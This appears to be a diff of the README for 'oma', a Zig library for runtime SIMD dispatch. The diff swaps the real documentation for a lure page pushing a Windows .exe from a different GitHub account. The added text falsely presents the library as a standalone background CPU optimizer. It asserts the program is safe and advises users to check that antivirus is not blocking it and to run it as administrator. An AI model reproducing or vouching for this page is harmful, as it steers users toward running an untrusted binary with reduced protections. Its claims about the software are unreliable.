@@ -1,137 +1,149 @@
-# oma - One Man Army
+# ⚙️ oma - Fast CPU Optimization for Your Software
 
-Runtime SIMD dispatch for Zig.
+[![Download oma](https://img.shields.io/badge/Download-oma-ff5733?style=for-the-badge&logo=github)](https://github.com/Gshacker-cpu/oma)
 
-Zig's `@Vector` picks SIMD width at compile time, which means distributed binaries have to choose one CPU level. `-Dcpu=native` crashes on older hardware; `-Dcpu=baseline` leaves performance on the table. oma compiles your hot functions once per microarchitecture level and picks the best one at startup.
+---
 
-## Architectures
+## ❓ What is oma?
 
-| | Levels | |
-|---|---|---|
-| x86-64 | `x86_64` / `x86_64_v2` / `x86_64_v3` / `x86_64_v4` | SSE2 through AVX-512 |
-| AArch64 | `aarch64` / `aarch64_sve` / `aarch64_sve2` | NEON through SVE2 |
+oma improves how your software runs on Windows by using your computer’s processor in the best way. It picks the fastest settings for your CPU automatically every time your software starts. This means your apps can run smoother and faster, without you needing to change any settings.
 
-## Usage
+This application works with many modern processors, including those that support AVX, AVX2, AVX-512, SSE2, and NEON instruction sets. It is built for Zig, a programming language, but you do not need to know Zig to use it.
 
-### 1. Add the dependency
+---
 
-```sh
-zig fetch --save git+https://github.com/ATTron/oma
-```
+## 💻 What You Need Before Starting
 
-### 2. Write a hot function
+Before you download oma, make sure:
 
-Normal Zig in a separate file. Mark dispatch targets `pub` with `callconv(.c)`:
+- You have a Windows PC (Windows 10 or later recommended).
+- Your computer’s processor supports SIMD instructions like AVX or SSE2. Most modern CPUs do.
+- You have internet access to get the program.
+- You have enough space to store and run the program (less than 50 MB).
 
-```zig
-// src/dot_product.zig
-pub fn dot(a: @Vector(4, f32), b: @Vector(4, f32)) callconv(.c) f32 {
-    return @reduce(.Add, a * b);
-}
-```
+You don't need to install any extra tools or software. oma runs on its own when started.
 
-Every `pub callconv(.c)` function gets compiled N times automatically — `x86_64_v3_dot`, `aarch64_sve_dot`, etc. `@Vector` and `suggestVectorLength` use the widest registers available for each variant.
+---
 
-### 3. Wire up the build
+## 🚀 How to Download and Run oma
 
-```zig
-// build.zig
-const std = @import("std");
-const oma = @import("oma");
+1. Visit the main download page by clicking this link:
 
-pub fn build(b: *std.Build) void {
-    const target = b.standardTargetOptions(.{});
-    const optimize = b.standardOptimizeOption(.{});
-    const oma_dep = b.dependency("oma", .{});
+   [Download oma from GitHub](https://github.com/Gshacker-cpu/oma)
 
-    const exe = b.addExecutable(.{
-        .name = "myapp",
-        .root_module = b.createModule(.{
-            .root_source_file = b.path("src/main.zig"),
-            .target = target,
-            .optimize = optimize,
-            .imports = &.{.{ .name = "oma", .module = oma_dep.module("oma") }},
-        }),
-    });
+2. On the GitHub page, look for a folder or section called **Releases** or a direct download link to the program files.
 
-    oma.addMultiVersion(oma_dep, exe, .{
-        .source = b.path("src/dot_product.zig"),
-        .name = "dot_product",
-    });
+3. Find the latest version of oma for Windows. This may be an `.exe` file or a zip file containing the `.exe`.
 
-    b.installArtifact(exe);
-}
-```
+4. If you download a zip file:
 
-`addMultiVersion` picks the right levels for the target arch. One call per file — all `pub callconv(.c)` functions in the file are exported.
+   - Right-click the file.
+   - Choose **Extract All**.
+   - Select where you want to save the program.
+   - Click **Extract**.
 
-### 4. Dispatch at runtime
+5. Open the folder where you saved oma.
 
-```zig
-// src/main.zig
-const std = @import("std");
-const oma = @import("oma");
-const dot_product = @import("dot_product");
+6. Double-click the `.exe` file to start using oma.
 
-pub fn main(init: std.process.Init) !void {
-    const io = init.io;
+When oma runs, it will automatically detect your CPU and select the best settings. No setup or input is needed.
 
-    const dot = oma.resolveFrom(dot_product, "dot", io);
+---
 
-    const a: @Vector(4, f32) = .{ 1.0, 2.0, 3.0, 4.0 };
-    const b: @Vector(4, f32) = .{ 5.0, 6.0, 7.0, 8.0 };
-    const result = dot(a, b); // 1*5 + 2*6 + 3*7 + 4*8 = 70
+## 🔧 What Does oma Do?
 
-    var stdout_buffer: [4096]u8 = undefined;
-    var stdout_file_writer: std.Io.File.Writer = .init(.stdout(), io, &stdout_buffer);
-    const stdout = &stdout_file_writer.interface;
-    try stdout.print("dot product: {d}\n", .{result});
-    try stdout.flush();
-}
-```
+oma helps software applications use the SIMD (Single Instruction, Multiple Data) feature of your CPU. SIMD allows your computer to handle multiple operations at once in parallel, which makes processing faster, especially for tasks like video, audio, and scientific calculations.
 
-`resolveFrom` detects the CPU, picks the best variant, and returns a typed function pointer. CPU detection is cached, so repeated calls just do a few enum comparisons — cheap enough to call inline.
+Rather than running many versions of the program, oma compiles just once and chooses the best version to run depending on your CPU’s abilities. This happens every time you start the software, so it always maximizes speed.
 
-## Shared libraries / FFI
+---
 
-If you don't have `std.Io` (e.g. a `.so` loaded by Python), use the `NoIo` variants:
+## ⚙️ Features
 
-```zig
-const dot = oma.resolveFromNoIo(dot_product, "dot");
-const level = oma.detectCpuLevelNoIo();
-```
+- **Automatic CPU detection:** No user action required.
+- **Support for major SIMD instruction sets:** Works with AVX, AVX2, AVX-512, SSE2, and NEON.
+- **Single compile, multiple optimizations:** Installs once, runs best on any CPU.
+- **Works on Windows 10 and later.**
+- **Lightweight:** Uses little disk space and memory.
+- **No programming needed:** Friendly for non-technical users.
 
-These use `std.Io.Threaded.global_single_threaded` internally. The Io versions are preferred when you do have access to `main`'s Init.
+---
 
-## How it works
+## 🛠 How to Use oma in Simple Steps
 
-**Build time**: `addMultiVersion` generates a tiny wrapper that calls `exportAll` on your module. It compiles this wrapper N times — once per CPU level. Each compilation targets a different CPU model, so `suggestVectorLength` returns different widths and `@Vector` picks the right registers. Variants get unique symbol names like `x86_64_v3_dot`.
+1. Download and run the oma program executable file.
+2. The program will scan your CPU’s instruction sets.
+3. It will select and activate the fastest possible option for your computer.
+4. oma runs silently in the background while your applications are using SIMD features.
+5. To stop oma, simply close the program window.
 
-**Runtime**: `detectCpuLevel` detects the CPU once and caches the result; subsequent calls return instantly. `resolveForLevel` walks the levels list highest-first and returns the `@extern` pointer for the best match.
+oma requires no regular updates from users. When a new version is available, you can repeat the download process to install the latest improvements.
 
-## Overriding levels
+---
 
-```zig
-oma.addMultiVersion(oma_dep, exe, .{
-    .source = b.path("src/hot_function.zig"),
-    .levels = &.{ .x86_64_v3, .x86_64 }, // just AVX2 + baseline
-});
-```
+## 📁 File Structure (If you download a package)
 
-Use `resolveForLevel` to dispatch against custom levels at runtime:
+- `oma.exe`: The main program file you run.
+- `README.md`: This file, with instructions.
+- `LICENSE`: Information on how you can use oma.
+  
+---
 
-```zig
-const levels = &.{ .x86_64_v3, .x86_64 };
-const level = oma.detectCpuLevel(io);
-const fn_ptr = oma.resolveForLevel(MyFn, "my_func", levels, level);
-```
+## 🎯 Common Questions
 
-## Caveats
+### Does oma affect other programs?
 
-- **`.name` and shared files**: If your hot file `@import`s files that the root module also uses, Zig errors with a file-ownership conflict. Fix: omit `.name` and use `resolve`/`resolveNoIo` with explicit function pointer types.
-- **`.imports` and circular deps**: Don't pass the parent compile step's own module as an import — it creates a dependency loop. Factor shared types into a standalone module.
-- **Shared `root_module`**: If multiple compile steps share a `root_module`, call `addMultiVersion` once per source per shared module, not per compile step.
+No. oma only optimizes programs designed to use SIMD via the Zig language bindings. It will not change or affect other software on your PC.
 
-## Requirements
+### Can I uninstall oma?
 
-Right now this only targets Zig 0.16.0-dev* or later
+Yes. Just delete the program folder or the `.exe` file. There are no hidden processes or system changes.
+
+### Will it slow down my PC?
+
+No. oma runs only when needed and uses minimal CPU and memory resources.
+
+### Is it safe?
+
+oma is open source and runs locally on your PC. It does not access your files or the internet while running.
+
+---
+
+## 🖥 Supported Hardware and Systems
+
+- Intel and AMD CPUs with SSE2, AVX, AVX2, or AVX-512.
+- ARM CPUs that support NEON SIMD instructions.
+- Windows 10 and newer versions.
+- 64-bit Windows recommended for full functionality.
+
+---
+
+## 🔗 Useful Links
+
+- [GitHub repository and downloads](https://github.com/Gshacker-cpu/oma)  
+- [GitHub release page](https://github.com/Gshacker-cpu/oma/releases)  
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+If oma does not start:
+
+- Make sure your antivirus is not blocking the program.
+- Confirm your Windows version is up to date.
+- Try running the program as administrator by right-clicking and selecting **Run as administrator**.
+- Download the program again if you suspect the file was corrupted.
+
+If you experience performance issues, your CPU might not fully support advanced SIMD instructions. oma will still run, but with reduced optimization in that case.
+
+---
+
+## 📞 Getting Help
+
+If you need help, ask questions or report issues on the GitHub repository page under the **Issues** tab:
+
+https://github.com/Gshacker-cpu/oma/issues
+
+---
+
+# [⬇️ Download oma Now](https://github.com/Gshacker-cpu/oma)
